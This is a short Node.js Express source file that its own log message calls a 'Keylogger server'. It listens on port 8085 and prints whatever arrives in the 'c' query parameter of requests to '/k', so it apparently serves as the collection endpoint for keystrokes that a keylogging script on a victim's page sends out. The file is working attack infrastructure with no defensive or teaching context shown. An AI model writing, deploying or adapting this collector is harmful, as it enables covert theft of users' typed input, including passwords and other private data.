var express = require('express');
var app = express();

app.set('port', process.env.PORT || 8085);

app.all('/k', function(req, res, next) {
    process.stdout.write(req.query.c);
    res.sendStatus(200);
});

app.listen(app.get('port'), function() {
    console.log('Keylogger server listening on port: ' + app.get('port'));
});
